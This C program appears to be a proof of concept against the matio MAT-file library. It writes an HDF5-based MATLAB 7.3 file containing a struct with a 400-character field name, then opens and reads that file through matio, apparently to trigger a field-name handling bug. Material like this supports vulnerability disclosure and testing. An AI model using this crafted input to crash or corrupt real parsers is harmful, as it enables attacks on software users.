#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <hdf5.h>
#include "matio.h"

#define LONG_LEN 400

static void write_header(const char *path)
{
    FILE *fp = fopen(path, "r+b");
    char hdr[116];
    char subsys[8];
    unsigned short version = 0x0200;
    unsigned short endian = 0x4d49;
    if (fp == NULL)
        exit(2);
    memset(hdr, ' ', sizeof(hdr));
    memcpy(hdr, "MATLAB 7.3 MAT-file, Platform: poc, Created by: poc", 52);
    hdr[115] = '\0';
    memset(subsys, 0, sizeof(subsys));
    fwrite(hdr, 1, 116, fp);
    fwrite(subsys, 1, 8, fp);
    fwrite(&version, 2, 1, fp);
    fwrite(&endian, 2, 1, fp);
    fclose(fp);
}

static void add_class(hid_t id, const char *cls)
{
    hid_t t = H5Tcopy(H5T_C_S1);
    hid_t sp, a;
    H5Tset_size(t, strlen(cls));
    H5Tset_strpad(t, H5T_STR_NULLTERM);
    sp = H5Screate(H5S_SCALAR);
    a = H5Acreate2(id, "MATLAB_class", t, sp, H5P_DEFAULT, H5P_DEFAULT);
    H5Awrite(a, t, cls);
    H5Aclose(a);
    H5Sclose(sp);
    H5Tclose(t);
}

static void add_double(hid_t gid, const char *name, double v)
{
    hsize_t dims[2] = {1, 1};
    hid_t sp = H5Screate_simple(2, dims, NULL);
    hid_t d = H5Dcreate2(gid, name, H5T_IEEE_F64LE, sp, H5P_DEFAULT, H5P_DEFAULT, H5P_DEFAULT);
    H5Dwrite(d, H5T_NATIVE_DOUBLE, H5S_ALL, H5S_ALL, H5P_DEFAULT, &v);
    add_class(d, "double");
    H5Dclose(d);
    H5Sclose(sp);
}

int main(void)
{
    const char *path = "/tmp/poc_longfield.mat";
    char longname[LONG_LEN + 1];
    hid_t fapl, fcpl, fid, g;
    mat_t *mat;
    matvar_t *var;

    memset(longname, 'f', LONG_LEN);
    longname[LONG_LEN] = '\0';

    fapl = H5Pcreate(H5P_FILE_ACCESS);
    H5Pset_libver_bounds(fapl, H5F_LIBVER_EARLIEST, H5F_LIBVER_V18);
    fcpl = H5Pcreate(H5P_FILE_CREATE);
    H5Pset_userblock(fcpl, 512);
    fid = H5Fcreate(path, H5F_ACC_TRUNC, fcpl, fapl);
    if (fid < 0)
        return 2;
    g = H5Gcreate2(fid, "s", H5P_DEFAULT, H5P_DEFAULT, H5P_DEFAULT);
    add_class(g, "struct");
    add_double(g, "alpha", 1.25);
    add_double(g, longname, 6.5);
    add_double(g, "beta", 2.5);
    H5Gclose(g);
    H5Fclose(fid);
    H5Pclose(fcpl);
    H5Pclose(fapl);
    write_header(path);

    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if (mat == NULL)
        return 3;
    var = Mat_VarRead(mat, "s");
    if (var != NULL)
        Mat_VarFree(var);
    Mat_Close(mat);
    return var == NULL ? 4 : 0;
}
